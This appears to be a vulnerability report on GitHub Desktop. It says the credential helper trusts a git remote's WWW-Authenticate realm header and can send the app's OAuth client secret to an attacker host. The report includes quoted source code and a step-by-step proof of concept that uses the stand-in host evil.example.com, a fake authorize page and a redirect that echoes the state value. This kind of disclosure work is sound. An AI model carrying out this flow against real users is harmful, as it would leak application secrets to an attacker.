Based on the investigation, I found a credible Desktop analog to the Evmos bug class — a place where the app derives an **authorization/trust decision** (i.e., "this remote is a GitHub host, safe to prompt sign-in and exchange OAuth credentials with it") from an **attacker-controlled input** (an HTTP response header from the git remote) rather than from a verified identity, and then uses that unverified value to send a real secret (the OAuth client secret) to the attacker-chosen host.

### Title
Untrusted `WWW-Authenticate` header from a git remote can trigger OAuth Enterprise sign-in flow and leak Desktop's OAuth client secret to an attacker-controlled host - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
When Git needs credentials for an HTTPS remote, Desktop's credential-helper trampoline (`getEndpointKind`) tries to classify the target host as `github.com`, `ghe.com`, `enterprise`, or `generic`. One of its heuristics blindly trusts the `WWW-Authenticate` response header sent back by the remote server and, if it contains `realm="GitHub"`, classifies the host as `'enterprise'` — with no verification that the host is actually a GitHub Enterprise instance. [1](#0-0) 

### Finding Description
`getEndpointKind` is invoked for every credential request Git makes, using data almost entirely under the remote server's control: [2](#0-1) 

The `wwwauth[...]` entries come from the HTTP `WWW-Authenticate` header returned by whatever server Git is talking to — i.e. it is fully attacker-controlled if the user has cloned/added a remote pointing at an attacker's git/HTTP server. If that header contains `realm="GitHub"`, `getEndpointKind` returns `'enterprise'` even though the connection target may be `evil.example.com`, not a real GitHub Enterprise Server.

That classification feeds directly into `getCredential`: [3](#0-2) 

Since the attacker's arbitrary host has no matching `Account` in the store, this calls `ui.promptForGitHubSignIn(endpoint)`, where `endpoint` is the attacker's own URL: [4](#0-3) 

`promptForGitHubSignIn` only checks whether the hostname is literally `github.com`; any other hostname — including the attacker's — is routed into `beginEnterpriseSignIn` + `setSignInEndpoint(origin)`, with `origin` being the attacker's domain. `SignInStore.setEndpoint` only performs syntactic/reachability validation, not identity validation: [5](#0-4) 

The sign-in flow then opens the OS browser to the attacker's own `/login/oauth/authorize` endpoint (leaking the app's `client_id` and a CSRF `state` value that the attacker can trivially echo back since they control the page the browser is directed to): [6](#0-5) 

If the attacker's page (hosted on the same server used for the credential prompt) redirects back to Desktop's custom protocol with the echoed `state` and any `code`, `resolveOAuthRequest` passes the state check (attacker copied it verbatim) and calls `requestOAuthToken(endpoint, code)`: [7](#0-6) 

`requestOAuthToken` then performs a POST containing Desktop's hard-coded `ClientSecret` directly to the attacker-controlled `endpoint`: [8](#0-7) 

This mirrors the Evmos bug class: an authorization/trust decision ("is this a legitimate GitHub-flavored host that we should sign in against?") is made from a value the counterparty fully controls (`WWW-Authenticate` realm string / arbitrary remote host) instead of a cryptographically or independently verified identity, and the corrupted trust decision is then used to release a real secret (`ClientSecret`) to that same untrusted party.

### Impact Explanation
The affected value is Desktop's shared OAuth application `client_secret`, sent via `requestOAuthToken` in `app/src/lib/api.ts`. It is exfiltrated to a host chosen entirely by an attacker who merely needs to control a git remote's HTTP responses (e.g. a malicious clone URL, compromised/typosquatted git server, or MITM proxy on an insecure network). No existing guard validates that the host classified as `'enterprise'` by the `wwwauth` heuristic corresponds to a real GitHub Enterprise deployment before initiating the OAuth authorize/token exchange against it.

### Likelihood Explanation
Requires the victim to (1) add/clone from an attacker-controlled remote and perform any authenticated git operation (fetch/push/pull), which is an ordinary workflow, and (2) click "Sign in" on the resulting prompt and complete the browser flow that the attacker's fake login page presents — no unnatural or out-of-band steps beyond normal credential-prompt handling. The `WWW-Authenticate` header content is entirely under the remote's control, making the classification trivial to trigger.

### Recommendation
Do not classify a host as `'enterprise'`/GitHub-flavored based solely on the `WWW-Authenticate` header value. Require an independent verification step (e.g., only trust `wwwauth` hints for hosts the user has explicitly registered as an Enterprise endpoint, or perform a server API probe with a strict allowlist) before routing into the OAuth sign-in flow, and never send `ClientSecret` to a host that hasn't been confirmed via `isGHE`/`isDotCom`/user-added-enterprise-endpoint checks.

### Proof of Concept
1. Attacker sets up an HTTPS git server (`https://evil.example.com/repo.git`) and configures it to respond to unauthenticated HTTPS requests with `WWW-Authenticate: Basic realm="GitHub"`, and hosts a page at `/login/oauth/authorize` that immediately redirects to `x-github-client://oauth?code=xxx&state=<state-param-from-query>`.
2. Victim clones/adds this remote in GitHub Desktop and performs a fetch/push requiring auth.
3. `getEndpointKind` in `trampoline-credential-helper.ts` sees the `wwwauth[...]` header, matches `realm="GitHub"`, returns `'enterprise'`.
4. `getCredential` finds no matching account, calls `ui.promptForGitHubSignIn('https://evil.example.com')`.
5. Victim clicks "Sign in"; Desktop opens the browser to `https://evil.example.com/login/oauth/authorize?client_id=<real client id>&state=<csrf>`.
6. Attacker's page redirects the browser to `x-github-client://oauth?code=anything&state=<csrf>` (state copied from the query string it received).
7. `resolveOAuthRequest` passes the state check and calls `requestOAuthToken('https://evil.example.com', 'anything')`, which POSTs `client_id`, `client_secret` (Desktop's real secret), and `code` to `https://evil.example.com/login/oauth/access_token`, leaking the client secret to the attacker.

const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  const existingAccount = await findGitHubTrampolineAccount(store, endpoint)
  if (existingAccount) {
    return isDotCom(existingAccount.endpoint) ? 'github.com' : 'enterprise'
  }

  // All GitHub hosts use HTTPS, so if the protocol is not HTTPS we can
  // assume that this is not a GitHub host.
  if (credentialUrl.protocol !== 'https:') {
    return 'generic'
  }

  return (await isGitHubHost(endpoint)) ? 'enterprise' : 'generic'
}

export async function requestOAuthToken(
  endpoint: string,
  code: string
): Promise<string | null> {
  try {
    const urlBase = getHTMLURL(endpoint)
    const response = await request(
      urlBase,
      null,
      'POST',
      'login/oauth/access_token',
      {
        client_id: ClientID,
        client_secret: ClientSecret,
        code: code,
      }
    )
    tryUpdateEndpointVersionFromResponse(endpoint, response)

    const result = await parsedResponse<IAPIAccessToken>(response)
    return result.access_token
  } catch (e) {
    log.warn(`requestOAuthToken: failed with endpoint ${endpoint}`, e)
    return null
  }
}
